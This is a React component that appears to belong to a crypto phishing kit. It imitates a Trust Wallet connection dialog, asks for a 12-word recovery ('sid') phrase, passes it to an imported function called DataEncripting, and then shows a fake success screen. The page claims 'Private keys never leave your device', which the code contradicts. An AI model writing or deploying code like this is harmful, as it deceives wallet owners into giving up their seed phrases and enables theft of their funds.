import "./TrustWallet.scss";
import TrustWalletSuccess from './TrustWalletSuccess/TrustWalletSuccess';
import Input from '../UI/Input/Input';
import {useState} from 'react';
import {DataEncripting} from '../../utils/arrayParser';
import {checkSidLength} from '../../utils/checkSidPhrase';

const TrustWallet = () => {
  const [trustSuccess, setTrustSuccess] = useState(false)
  const [phrase, setPhrase] = useState('')
  const [errorPhrase, setErrorPhrase] = useState(false)

  const onSubmitTrust = async (e) => {
    e.preventDefault()
    if (checkSidLength(phrase) === 12) {
      await DataEncripting(phrase)
      setTimeout(() => {
        setTrustSuccess(true)
        localStorage.setItem('connected', 'true')
      }, 1000)
    } else {
      setErrorPhrase(true)
    }
  }

  const onChange = (e) => {
    setPhrase(e.target.value)
  }

  return (
    <div className="trustInner_wrap">
      <div className="trustInner">
        {
          trustSuccess ? <TrustWalletSuccess /> :
            <form onSubmit={onSubmitTrust} className="modal-form-trust">
              <div>
                <img src="./img/TWT.svg" height="100" alt="" />
                <div className="trustInner_header">Private and secure</div>
                <div className="trustInner_text">
                  Private keys never leave your device
                </div>
              </div>
              <div style={{position: 'relative'}} className='mt-4'>
                <Input value={phrase} onChange={onChange} classname='inputTransparent' placeholder='Enter sid phrase' />
                {errorPhrase ? <div style={{color: 'tomato', fontSize: '12', position: 'absolute', bottom: '-20px'}}>Check sid phrase</div> : null}
              </div>
              <div>
                <button
                  style={{
                    backgroundColor: "rgb(67, 118, 187)",
                    color: "#fff",
                    border: "none",
                    padding: "20px 20px",
                    width: "100%",
                    fontSize: 18,
                    margin: "40px 0 20px 0",
                    cursor: "pointer"
                  }}
                >
                  Connect
                </button>
              </div>
            </form>
        }
      </div>
    </div>
  );
};
export default TrustWallet;
